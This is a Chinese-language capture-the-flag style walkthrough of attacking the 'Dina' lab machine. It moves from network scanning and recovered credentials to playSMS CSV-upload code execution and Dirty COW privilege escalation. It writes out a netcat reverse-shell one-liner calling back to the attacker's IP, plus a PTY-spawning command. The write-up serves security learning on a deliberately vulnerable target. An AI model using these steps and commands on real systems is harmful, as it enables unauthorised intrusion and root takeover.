# Dina靶机渗透

## 0x00 主机发现

kali IP地址192.168.110.132

因为与攻击者kali连接在同一张网卡上，处于同一网段所以只需要做二层主机发现即可，可使用netdiscover工具主动模式下扫描网段，找到目标靶机的IP地址

![1622775385244](1622775385244.png)

## 0x01 端口/服务扫描

使用masscan工具快速扫描目标靶机开放端口

![1622775604324](1622775604324.png)

再使用nmap对靶机仅开放的80端口做细致的服务扫描

![1622775784800](1622775784800.png)

## 0x02 漏洞挖掘

既然对外提供web服务，直接访问该网站

![1622775932720](1622775932720.png)

学习的天使Dina！

主页仅有提交查询按钮，点击跳转后并无可用信息，访问nmap扫描结果中的robots.txt文件，发现存在五个网站后台文件路径，依次访问

在noting/路径网页源代码存在信息

![1622776377180](1622776377180.png)

其他文件路径下访问页面相同，均只有跳转至首页的链接

![1622776491734](1622776491734.png)

使用dirb后台目录扫描，新发现一条secure/路径，访问后得到backup.zip文件

![1622776682528](1622776682528.png)

发现解压改文件需要密码，想到之前访问nothing/文件下获得的那一组字符串，尝试一番后成功（freedom），用记事本打开解压后得到的.mp3文件，拿到后台登录的路径地址以及账户名

![1622777374749](1622777374749.png)

依旧是使用nothing/路径里获得的那一组字符串（diana），登录了网站后台

![1622777745158](1622777745158.png)

一番探索后找到了多处.csv文件上传点，在该处尝试是否存在文件上传漏洞或者寻找playSMS的漏洞

![1622777983147](1622777983147.png)

![1622882448603](1622882448603.png)

进入kali，使用searchsploit和msfconsole工具寻找playSMS的漏洞

![1622790046672](1622790046672.png)

![1622790256293](1622790256293.png)

看到在编号2是csv文件上传代码执行的漏洞，结合上文提到的csv文件上传页面，该漏洞可利用的可能性很大，就先选择该漏洞尝试

## 0x03 漏洞利用

配置好部分必需参数，成功拿到www-data账户权限

![1622791853439](1622791853439.png)

提前打开kali监听，在靶机使用一句话反弹shell

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.132 1234 >/tmp/f
```

![1622797428635](1622797428635.png)

## 0x04 提权

查看系统的内核版本以及发行版本

![1622797503523](1622797503523.png)

大于2.6.22版本，所以我们优先考虑使用脏牛提权

![1622797998683](1622797998683.png)

查看当前etc/passwd，替换成功

![1622798058977](1622798058977.png)

切换到firefart登录，提权完成

```shell
//将简单的Shell转换成为完全交互式的tty
python -c 'import pty; pty.spawn("/bin/bash")'
```

![1622881172138](1622881172138.png)

## 0x05 补充csv上传注入漏洞

该靶机还存在csv文件上传漏洞，使用searchsploit工具所查到的42044.txt文件有详细记录

![1622881667819](1622881667819.png)

创建shell.csv文件，按照漏洞利用说明填写并且来到对应的上传点

![1622882290977](1622882290977.png)

抓包修改User-Agent值，发现命令执行成功

![1622882738832](1622882738832.png)

那么就可以在kali打开监听，发送反弹shell命令

![1622883057971](1622883057971.png)